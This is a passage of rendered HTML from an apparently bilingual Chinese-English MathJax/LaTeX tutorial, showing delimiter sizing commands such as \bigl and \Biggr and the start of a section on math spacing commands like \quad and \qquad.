delim-size1"><span>‖</span></span></span><span style="top:-2.85199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.851em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.852em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.851em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.852em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\left \uparrow \frac{a}{b} \right \downarrow \quad<br>\left \Uparrow \frac{a}{b} \right \Downarrow \quad<br>\left \updownarrow \frac{a}{b} \right \Updownarrow</td></tr><tr><td style="text-align:left">混合括号<br/>Delimiters can be mixed,as long as \left and \right match</td><td style="text-align:left">$\left [ 0,1 \right )  \left \langle \psi \right</td><td style="text-align:left">$</td></tr><tr><td style="text-align:left">如果您不希望某一侧括号显示，可以使用\left. 和 \right.（带有英文句号）<br/>Use \left. and \right. if you do not want a delimiter to appear</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mfrac><mi>A</mi><mi>B</mi></mfrac><mo fence="true">}</mo></mrow><mo>→</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">\left . \frac{A}{B} \right \} \to X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.222341em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">}</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></td><td style="text-align:left">\left . \frac{A}{B} \right } \to X</td></tr><tr><td style="text-align:left">括号的大小<br>Size of the delimiters (add “l” or “r” to indicate the side for proper spacing)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo fence="true">(</mo><mo fence="true">(</mo><mo fence="true">(</mo><mo fence="true">(</mo><mo>…</mo><mtext> </mtext><mo fence="true">]</mo><mo fence="true">]</mo><mo fence="true">]</mo><mo fence="true">]</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">( \bigl( \Bigl( \biggl( \Biggl( \dots \Biggr] \biggr] \Bigr] \bigr] ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mopen">(</span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mopen"><span class="delimsizing size2">(</span></span><span class="mopen"><span class="delimsizing size3">(</span></span><span class="mopen"><span class="delimsizing size4">(</span></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose"><span class="delimsizing size4">]</span></span><span class="mclose"><span class="delimsizing size3">]</span></span><span class="mclose"><span class="delimsizing size2">]</span></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mclose">]</span></span></span></span></td><td style="text-align:left">( \bigl( \Bigl( \biggl( \Biggl( \dots \Biggr] \biggr] \Bigr] \bigr] ]</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mo fence="true">{</mo><mo fence="true">{</mo><mo fence="true">{</mo><mo fence="true">{</mo><mo>…</mo><mtext> </mtext><mo fence="true">⟩</mo><mo fence="true">⟩</mo><mo fence="true">⟩</mo><mo fence="true">⟩</mo><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">\{ \bigl\{ \Bigl\{ \biggl\{ \Biggl\{ \dots \Biggr\rangle \biggr\rangle \Bigr\rangle \bigr\rangle \rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mopen">{</span><span class="mopen"><span class="delimsizing size1">{</span></span><span class="mopen"><span class="delimsizing size2">{</span></span><span class="mopen"><span class="delimsizing size3">{</span></span><span class="mopen"><span class="delimsizing size4">{</span></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose"><span class="delimsizing size4">⟩</span></span><span class="mclose"><span class="delimsizing size3">⟩</span></span><span class="mclose"><span class="delimsizing size2">⟩</span></span><span class="mclose"><span class="delimsizing size1">⟩</span></span><span class="mclose">⟩</span></span></span></span></td><td style="text-align:left">{ \bigl{ \Bigl{ \biggl{ \Biggl{ \dots<br>\Biggr\rangle \biggr\rangle \Bigr\rangle \bigr\rangle \rangle</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">$|  \big|  \Big|  \bigg|  \Bigg|  \dots \Bigg</td><td style="text-align:left">\bigg</td><td style="text-align:left">\Big</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mo fence="true">⌊</mo><mo fence="true">⌊</mo><mo fence="true">⌊</mo><mo fence="true">⌊</mo><mo>…</mo><mtext> </mtext><mo fence="true">⌉</mo><mo fence="true">⌉</mo><mo fence="true">⌉</mo><mo fence="true">⌉</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lfloor \bigl\lfloor \Bigl\lfloor \biggl\lfloor \Biggl\lfloor \dots \Biggr\rceil \biggr\rceil \Bigr\rceil \bigr\rceil \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mopen">⌊</span><span class="mopen"><span class="delimsizing size1">⌊</span></span><span class="mopen"><span class="delimsizing size2">⌊</span></span><span class="mopen"><span class="delimsizing size3">⌊</span></span><span class="mopen"><span class="delimsizing size4">⌊</span></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose"><span class="delimsizing size4">⌉</span></span><span class="mclose"><span class="delimsizing size3">⌉</span></span><span class="mclose"><span class="delimsizing size2">⌉</span></span><span class="mclose"><span class="delimsizing size1">⌉</span></span><span class="mclose">⌉</span></span></span></span></td><td style="text-align:left">\lfloor \bigl\lfloor \Bigl\lfloor \biggl\lfloor \Biggl\lfloor \dots<br>\Biggr\rceil \biggr\rceil \Bigr\rceil \bigr\rceil \rceil</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↑</mo><mo fence="false">↑</mo><mo fence="false">↑</mo><mo fence="false">↑</mo><mo fence="false">↑</mo><mo>…</mo><mo fence="false">⇓</mo><mo fence="false">⇓</mo><mo fence="false">⇓</mo><mo fence="false">⇓</mo><mo>⇓</mo></mrow><annotation encoding="application/x-tex">\uparrow \big\uparrow \Big\uparrow \bigg\uparrow \Bigg\uparrow \dots \Bigg\Downarrow \bigg\Downarrow \Big\Downarrow \big\Downarrow \Downarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.005em;vertical-align:-1.250025em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.25099em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.85299em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1529850000000001em;"><span style="top:-1.9509850000000002em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.5469850000000003em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.557975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.153985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45398em;"><span style="top:-1.6509800000000001em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.24698em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.84298em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.4549800000000004em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.754975em;"><span style="top:-1.350975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-1.9469750000000001em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.542975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.138975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.1599649999999997em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.755975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7549750000000002em;"><span style="top:-1.350985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-1.9459849999999999em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.541985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.137985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.158975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.754975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45398em;"><span style="top:-1.6509900000000002em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.24599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.84199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.45398em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1529850000000001em;"><span style="top:-1.9509950000000003em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.545995em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.152985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.85199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇓</span></span></span></span></td><td style="text-align:left">\uparrow \big\uparrow \Big\uparrow \bigg\uparrow \Bigg\uparrow \dots<br>\Bigg\Downarrow \bigg\Downarrow \Big\Downarrow \big\Downarrow \Downarrow</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↕</mo><mo fence="false">↕</mo><mo fence="false">↕</mo><mo fence="false">↕</mo><mo fence="false">↕</mo><mo>…</mo><mo fence="false">⇕</mo><mo fence="false">⇕</mo><mo fence="false">⇕</mo><mo fence="false">⇕</mo><mo>⇕</mo></mrow><annotation encoding="application/x-tex">\updownarrow \big\updownarrow \Big\updownarrow \bigg\updownarrow \Bigg\updownarrow \dots \Bigg\Updownarrow \bigg\Updownarrow \Big\Updownarrow \big\Updownarrow \Updownarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">↕</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.00401em;vertical-align:-1.250025em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.851em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.852em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1519949999999999em;"><span style="top:-1.9509950000000003em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-2.545995em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.152995em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45299em;"><span style="top:-1.6509900000000002em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-2.24599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.84199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.45399em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7539850000000001em;"><span style="top:-1.350985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-1.9459849999999999em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.541985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.137985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.158975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-3.754985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7539850000000001em;"><span style="top:-1.350985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-1.9459849999999999em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.541985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.137985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.158975em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.754985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45299em;"><span style="top:-1.6509900000000002em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.24599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.84199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.45399em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1519949999999999em;"><span style="top:-1.9509950000000003em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.545995em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-3.152995em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.851em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.852em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇕</span></span></span></span></td><td style="text-align:left">\updownarrow \big\updownarrow \Big\updownarrow \bigg\updownarrow \Bigg\updownarrow \dots<br>\Bigg\Updownarrow \bigg\Updownarrow \Big\Updownarrow \big\Updownarrow \Updownarrow</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">/</mi><mo fence="false">/</mo><mo fence="false">/</mo><mo fence="false">/</mo><mo fence="false">/</mo><mo>…</mo><mo fence="false">\</mo><mo fence="false">\</mo><mo fence="false">\</mo><mo fence="false">\</mo><mi mathvariant="normal">\</mi></mrow><annotation encoding="application/x-tex">/ \big/ \Big/ \bigg/ \Bigg/ \dots \Bigg\backslash \bigg\backslash \Big\backslash \big\backslash \backslash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mord">/</span><span class="mord"><span class="delimsizing size1">/</span></span><span class="mord"><span class="delimsizing size2">/</span></span><span class="mord"><span class="delimsizing size3">/</span></span><span class="mord"><span class="delimsizing size4">/</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="delimsizing size4">\</span></span><span class="mord"><span class="delimsizing size3">\</span></span><span class="mord"><span class="delimsizing size2">\</span></span><span class="mord"><span class="delimsizing size1">\</span></span><span class="mord">\</span></span></span></span></td><td style="text-align:left">/ \big/ \Big/ \bigg/ \Bigg/ \dots <br>\Bigg\backslash \bigg\backslash \Big\backslash \big\backslash \backslash</td><td style="text-align:left"></td></tr></tbody></table><h2 id="26-空格与换行-spacing-line-breaking"><a class="markdownIt-Anchor" href="#26-空格与换行-spacing-line-breaking"></a> 2.6 空格与换行 Spacing &amp; Line breaking</h2><h3 id="261-空格-spacing"><a class="markdownIt-Anchor" href="#261-空格-spacing"></a> 2.6.1 空格 Spacing</h3><p>MathJax能够自动处理大多数空格间距的大小，但如果您需要自己控制，可参考下表。</p><p>序号 | 样式 | LaTeX | 中文说明英文说明<br />:----: | :----: | :---- | :---- | :----<br />1 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mspace width="2em"/><mi>b</mi></mrow><annotation encoding="application/x-tex">a \qquad b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:2em;"></span><span class="mord mathnormal">b</span></span></span></span> | a \qquad b | 双空格 | double quad space<br />2 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mspace width="1em"/><mi>b</mi></mrow><annotation encoding="application/x-tex">a \quad b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">b</span></span></span></span> | a \quad b | 单空格 | quad space<br />3 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a\ b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace"> </span><span class="mord mathnormal">b</span></span></span></span> | a\ b | 字符空格 | text space<br />4 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \text{ } b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord text"><span class="mord"> </span></span><span class="mord mathnormal">b</span></span></span></span> | a \text{ } b | 文本模式中的字符空格 | text space in text mode<br />5 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>  </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a\;b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord 